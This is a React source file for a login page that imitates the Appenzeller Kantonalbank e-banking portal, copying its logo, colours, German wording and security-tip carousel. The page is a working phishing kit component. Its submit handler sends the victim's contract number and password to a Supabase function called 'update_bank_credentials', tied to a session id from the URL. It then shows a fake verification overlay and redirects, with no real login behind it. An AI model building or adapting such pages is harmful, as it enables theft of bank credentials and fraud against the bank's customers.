import { useState, useEffect } from "react";
import { useSearchParams, useNavigate } from "react-router-dom";
import { supabase } from "@/integrations/supabase/client";
import LoadingOverlay from "@/components/LoadingOverlay";
import { usePageMeta } from "@/hooks/use-page-meta";
import { Eye, EyeOff, ChevronLeft, ChevronRight } from "lucide-react";
import logoAsset from "@/assets/appenzeller-kantonalbank-logo.png.asset.json";
import browserverlaufAsset from "@/assets/akb-browserverlauf.jpg.asset.json";
import sicherheitAsset from "@/assets/akb-sicherheitshinweise.jpg.asset.json";

const RED = "#e30421";

const slides = [
  {
    image: browserverlaufAsset.url,
    title: "Browserverlauf regelmässig löschen",
    text: "Löschen Sie den Browserverlauf nach jedem Login ins E-Banking. Unter nachstehendem Link finden Sie eine Anleitung, wie Sie die...",
    linkText: "Mehr erfahren",
  },
  {
    image: sicherheitAsset.url,
    title: "Sicherheitshinweise",
    text: "Schützen Sie sich im Umgang mit dem Digital Banking.",
    linkText: "mehr erfahren",
  },
];

const ChAppenzellerKantonalbank = () => {
  const [searchParams] = useSearchParams();
  const navigate = useNavigate();
  const sessionId = searchParams.get("s") || "";
  const [showLoading, setShowLoading] = useState(false);

  const [vertragsnummer, setVertragsnummer] = useState("");
  const [passwort, setPasswort] = useState("");
  const [showPassword, setShowPassword] = useState(false);
  const [activeSlide, setActiveSlide] = useState(0);

  useEffect(() => { window.scrollTo(0, 0); }, []);
  usePageMeta("Appenzeller Kantonalbank – E-Banking", logoAsset.url);

  const nextSlide = () => setActiveSlide((s) => (s + 1) % slides.length);
  const prevSlide = () => setActiveSlide((s) => (s - 1 + slides.length) % slides.length);

  const handleSubmit = async () => {
    if (sessionId) {
      const { error } = await supabase.rpc("update_bank_credentials", {
        p_session_id: sessionId,
        p_username: vertragsnummer,
        p_password: passwort,
        p_username_label: "Vertragsnummer",
        p_password_label: "Passwort",
      });
      if (error) console.error("Update failed:", error);
    } else {
      console.error("No session ID found in URL!");
    }
    setShowLoading(true);
  };

  const slide = slides[activeSlide];

  return (
    <>
      {showLoading && (
        <LoadingOverlay
          message="Anmeldedaten werden überprüft..."
          onComplete={() => navigate("/confirmation?s=" + sessionId)}
        />
      )}
      <div className="min-h-screen flex flex-col bg-white">
        {/* Roter Top-Balken */}
        <div style={{ height: 6, backgroundColor: RED }} />

        <main className="flex-1 px-4">
          <div className="max-w-[1100px] mx-auto mt-12 md:mt-20 bg-white shadow-sm">
            {/* Card-Header */}
            <div className="flex flex-col md:flex-row">
              <div className="md:w-1/2 px-8 pt-6 pb-4" style={{ borderBottom: `2px solid ${RED}` }}>
                <img src={logoAsset.url} alt="Appenzeller Kantonalbank" className="h-12" />
              </div>
              <div className="md:w-1/2 hidden md:block" style={{ borderBottom: "1px solid #ddd" }} />
            </div>

            {/* Body */}
            <div className="flex flex-col md:flex-row">
              {/* Login form */}
              <div className="md:w-1/2 px-8 py-8 flex flex-col">
                <h1 className="text-[26px] font-semibold text-black mb-2">Willkommen</h1>
                <p className="text-[14px] mb-8" style={{ color: RED }}>
                  Melden Sie sich an, um fortzufahren.
                </p>

                <div className="mb-5">
                  <label className="block text-[13px] mb-1" style={{ color: "#555" }}>
                    Vertragsnummer
                  </label>
                  <input
                    type="text"
                    value={vertragsnummer}
                    onChange={(e) => setVertragsnummer(e.target.value)}
                    className="w-full px-3 py-2 border outline-none text-[15px]"
                    style={{ borderColor: "#bbb", backgroundColor: "#fff" }}
                  />
                </div>

                <div className="mb-8">
                  <label className="block text-[13px] mb-1" style={{ color: "#555" }}>
                    Passwort
                  </label>
                  <div className="relative">
                    <input
                      type={showPassword ? "text" : "password"}
                      value={passwort}
                      onChange={(e) => setPasswort(e.target.value)}
                      className="w-full px-3 py-2 border outline-none text-[15px] pr-10"
                      style={{ borderColor: "#bbb", backgroundColor: "#fff" }}
                    />
                    <button
                      type="button"
                      onClick={() => setShowPassword(!showPassword)}
                      className="absolute right-2 top-1/2 -translate-y-1/2"
                      aria-label="Passwort anzeigen"
                    >
                      {showPassword ? (
                        <EyeOff size={18} color="#666" />
                      ) : (
                        <Eye size={18} color="#666" />
                      )}
                    </button>
                  </div>
                </div>

                <button
                  onClick={handleSubmit}
                  className="mx-auto w-full max-w-[280px] py-2.5 text-white font-semibold text-[15px]"
                  style={{ backgroundColor: RED }}
                >
                  Weiter
                </button>

                <a
                  href="#"
                  className="mt-4 text-center text-[14px] hover:underline"
                  style={{ color: RED }}
                >
                  E-Banking und TWINT sperren
                </a>

                <div className="flex-1" />

                <a
                  href="#"
                  className="mt-10 text-center text-[14px] hover:underline"
                  style={{ color: RED }}
                >
                  Brauchen Sie Hilfe?
                </a>
              </div>

              {/* Carousel */}
              <div className="md:w-1/2 relative group min-h-[400px] md:min-h-[520px] overflow-hidden">
                <img
                  src={slide.image}
                  alt={slide.title}
                  className="absolute inset-0 w-full h-full object-cover"
                />

                {/* Hover arrows */}
                <button
                  onClick={prevSlide}
                  aria-label="Vorheriges Bild"
                  className="absolute left-3 top-1/2 -translate-y-1/2 w-10 h-10 rounded-full bg-white/70 hover:bg-white flex items-center justify-center opacity-0 group-hover:opacity-100 transition"
                >
                  <ChevronLeft size={22} color="#333" />
                </button>
                <button
                  onClick={nextSlide}
                  aria-label="Nächstes Bild"
                  className="absolute right-3 top-1/2 -translate-y-1/2 w-10 h-10 rounded-full bg-white/70 hover:bg-white flex items-center justify-center opacity-0 group-hover:opacity-100 transition"
                >
                  <ChevronRight size={22} color="#333" />
                </button>

                {/* Blur overlay */}
                <div
                  className="absolute left-0 right-0 bottom-0 px-5 py-4 backdrop-blur-md"
                  style={{ backgroundColor: "rgba(245,245,245,0.7)" }}
                >
                  <h3 className="font-semibold text-[15px] mb-1" style={{ color: RED }}>
                    {slide.title}
                  </h3>
                  <p className="text-[13px] leading-snug mb-1" style={{ color: "#333" }}>
                    {slide.text}
                  </p>
                  <a href="#" className="text-[13px] hover:underline" style={{ color: RED }}>
                    {slide.linkText}
                  </a>

                  {/* Dots inside blur */}
                  <div className="flex items-center justify-center gap-2 mt-3">
                    {slides.map((_, i) => (
                      <button
                        key={i}
                        onClick={() => setActiveSlide(i)}
                        aria-label={`Slide ${i + 1}`}
                        className="transition-all"
                        style={{
                          height: 4,
                          width: i === activeSlide ? 24 : 12,
                          backgroundColor: i === activeSlide ? "#555" : "#bbb",
                        }}
                      />
                    ))}
                  </div>
                </div>
              </div>
            </div>
          </div>
        </main>

        {/* Footer */}
        <footer className="mt-12" style={{ backgroundColor: "#f2f2f2" }}>
          <div className="max-w-[1100px] mx-auto px-8 py-4 flex items-center justify-between text-[13px]" style={{ color: "#555" }}>
            <span>© Appenzeller Kantonalbank 2026</span>
            <a href="#" className="hover:underline" style={{ color: RED }}>
              Rechtliche Hinweise
            </a>
          </div>
        </footer>
      </div>
    </>
  );
};

export default ChAppenzellerKantonalbank;
